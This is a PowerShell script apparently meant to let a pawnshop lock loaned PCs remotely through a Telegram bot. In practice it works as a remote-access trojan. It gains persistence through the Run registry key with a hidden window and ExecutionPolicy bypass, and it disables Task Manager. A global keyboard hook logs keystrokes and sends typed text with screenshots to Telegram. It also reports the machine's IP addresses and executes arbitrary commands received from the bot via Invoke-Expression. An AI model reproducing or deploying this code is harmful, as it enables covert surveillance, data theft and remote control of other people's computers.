# ============================
# Pawnshop Lockdown v5.0 - Advanced Remote Control with Persistence, Anti-Detection, Granular Commands, Keylogger & Alerts
# ============================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIG ---
$githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnfinal.ps1" # Optional for self-update
$localFolder = "$env:ProgramData\PawnshopLock"
$localFile   = "$localFolder\pawnlock.ps1"
$imageURL    = "https://raw.githubusercontent.com/diezul/x/main/69.jpeg"
$tempImg     = "$env:TEMP\pawnlock.jpg"
$botToken    = "YOUR_BOT_TOKEN"  # Replace with your bot token
$chatID      = 123456789          # Replace with your chat ID (integer)
$pcID        = $env:COMPUTERNAME
$lockCmd     = "/lock$pcID"
$unlockCmd   = "/unlock$pcID"
$screenshotCmd = "/screenshot$pcID"
$execCmdPrefix = "/exec$pcID "  # Followed by command to execute

# --- PERSISTENCE VIA RUN REGISTRY (User) ---
function Setup-Persistence {
    try {
        if (-not (Test-Path $localFolder)) {
            New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
        }
        if (-not (Test-Path $localFile)) {
            Invoke-WebRequest -Uri $githubURL -OutFile $localFile
        }
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localFile`""
        Set-ItemProperty -Path $regPath -Name "PawnshopLock" -Value $value
    } catch {
        # Consider logging error here
    }
}

# --- SEND TELEGRAM MESSAGE ---
function Send-Telegram {
    param([string]$msg)
    try {
        $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
    } catch {
        # Consider logging error here
    }
}

# --- SEND TELEGRAM PHOTO ---
function Send-TelegramPhoto {
    param([string]$photoPath, [string]$caption = "")
    try {
        $form = @{
            chat_id = $chatID
            caption = $caption
            photo   = Get-Item $photoPath
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendPhoto" -Method Post -Form $form
    } catch {
        # Consider logging error here
    }
}

# --- DISABLE TASK MANAGER ---
function Disable-TaskManager {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
    } catch {
        # Consider logging error here
    }
}

# --- ENABLE TASK MANAGER ---
function Enable-TaskManager {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 0 -Type DWord -Force
        }
    } catch {
        # Consider logging error here
    }
}

# --- SCREENSHOT FUNCTION ---
function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $file = "$env:TEMP\screenshot_$([guid]::NewGuid().ToString()).jpg"
    $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $file
}

# --- KEYLOGGER & ALERTS ---
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr KProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static KProc proc = Hook;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static StringBuilder buffer = new StringBuilder();

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);

    public static event Action<string> OnKeywordDetected;

    public static void Start() {
        hookId = SetHook(proc);
    }

    public static void Stop() {
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(KProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            char c = Convert.ToChar(vkCode);
            buffer.Append(c);

            string text = buffer.ToString().ToLower();

            // Check for keywords "porn" or "codru"
            if (text.Contains("porn") || text.Contains("codru")) {
                OnKeywordDetected?.Invoke(text);
                buffer.Clear();
            }

            // Limit buffer size to avoid memory issues
            if (buffer.Length > 100) buffer.Remove(0, buffer.Length - 50);
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

# --- GLOBAL VARIABLES ---
$global:lockActive = $false

# --- FUNCTION TO HANDLE KEYWORD ALERT ---
function On-KeywordDetected {
    param([string]$typedText)
    if (-not $global:lockActive) {
        $msg = "⚠ Utilizatorul PC $pcID a tastat: '$typedText'"
        Send-Telegram $msg
        $screenshotPath = Take-Screenshot
        Send-TelegramPhoto -photoPath $screenshotPath -caption "Screenshot la tastarea '$typedText' pe PC $pcID"
        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
    }
}

# Register event handler
[KeyLogger]::OnKeywordDetected += { param($text) On-KeywordDetected $text }

# --- EXTENDED KEYBOARD BLOCKER ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr KProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static KProc proc = Hook;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);

    public static void Block() { hookId = SetHook(proc); }
    public static void Unblock() { UnhookWindowsHookEx(hookId); }

    private static IntPtr SetHook(KProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);

            // Allow 'C' key to exit lockdown immediately
            if (vkCode == 0x43) Environment.Exit(0);

            bool altPressed = (GetAsyncKeyState(0x12) & 0x8000) != 0;
            bool ctrlPressed = (GetAsyncKeyState(0x11) & 0x8000) != 0;

            // Block Alt+Tab, Ctrl+Esc, Alt+Esc, Windows keys
            if ((vkCode == 0x09 && altPressed) || // Alt+Tab
                (vkCode == 0x1B && ctrlPressed) || // Ctrl+Esc
                (vkCode == 0x1B && altPressed) || // Alt+Esc
                (vkCode == 0x5B) || // Left Windows
                (vkCode == 0x5C)) { // Right Windows
                return (IntPtr)1; // Block key
            }
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

# --- LOCK-PC FUNCTION ---
function Lock-PC {
    $global:lockActive = $true
    Disable-TaskManager

    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127|169\.254|^0\.|255|fe80'
        })[0].IPAddress
    } catch { $ipLocal = "n/a" }
    try {
        $ipPublic = Invoke-RestMethod "https://api.ipify.org"
    } catch { $ipPublic = "n/a" }
    $msg = "🔒 PC Locked: $pcID`nUser: $user`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nUnlock with: $unlockCmd"
    Send-Telegram $msg

    [KeyBlocker]::Block()

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
        $form = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle = 'None'
            WindowState = 'Maximized'
            StartPosition = 'Manual'
            TopMost = $true
            Location = $screen.Bounds.Location
            Size = $screen.Bounds.Size
            Cursor = [System.Windows.Forms.Cursors]::None
            BackColor = 'Black'
        }
        $pictureBox = New-Object Windows.Forms.PictureBox -Property @{
            Image = [System.Drawing.Image]::FromFile($tempImg)
            Dock = 'Fill'
            SizeMode = 'StretchImage'
        }
        $form.Controls.Add($pictureBox)
        $form.Add_Deactivate({ $_.Activate() })
        $form.Show()
        $form
    }

    $offset = 0
    try {
        $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
        if ($start.result.Count -gt 0) {
            $offset = ($start.result | Select-Object -Last 1).update_id + 1
        }
    } catch {}

    $timer = New-Object Windows.Forms.Timer
    $timer.Interval = 4000
    $timer.Add_Tick({
        try {
            $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
            foreach ($u in $updates.result) {
                $offset = $u.update_id + 1
                if ($u.message.text -eq $unlockCmd -and $u.message.chat.id -eq [int]$chatID) {
                    $timer.Stop()
                    [KeyBlocker]::Unblock()
                    foreach ($form in $forms) { $form.Close() }
                    Enable-TaskManager
                    $global:lockActive = $false
                    [System.Windows.Forms.Application]::Exit()
                }
                elseif ($u.message.text.StartsWith($execCmdPrefix) -and $u.message.chat.id -eq [int]$chatID) {
                    $command = $u.message.text.Substring($execCmdPrefix.Length)
                    $output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }
                    Send-Telegram "🖥 Exec output on $pcID:`n$output"
                }
                elseif ($u.message.text -eq $screenshotCmd -and $u.message.chat.id -eq [int]$chatID) {
                    $shot = Take-Screenshot
                    Send-TelegramPhoto -photoPath $shot -caption "Screenshot from $pcID"
                    Remove-Item $shot -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {}
    })
    $timer.Start()

    [System.Windows.Forms.Application]::Run()
}

# --- MAIN LISTENER LOOP ---
Setup-Persistence

# Start keylogger
[KeyLogger]::Start()

$offset = 0
try {
    $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
    if ($start.result.Count -gt 0) {
        $offset = ($start.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

while ($true) {
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            if ($u.message.chat.id -eq [int]$chatID) {
                if ($u.message.text -eq $lockCmd) {
                    Lock-PC
                }
                elseif ($u.message.text.StartsWith($execCmdPrefix)) {
                    # Handled inside Lock-PC timer to avoid concurrency issues
                }
                elseif ($u.message.text -eq $screenshotCmd) {
                    $shot = Take-Screenshot
                    Send-TelegramPhoto -photoPath $shot -caption "Screenshot from $pcID"
                    Remove-Item $shot -Force -ErrorAction SilentlyContinue
                }
            }
        }
    } catch {}
    Start-Sleep -Seconds 5
}
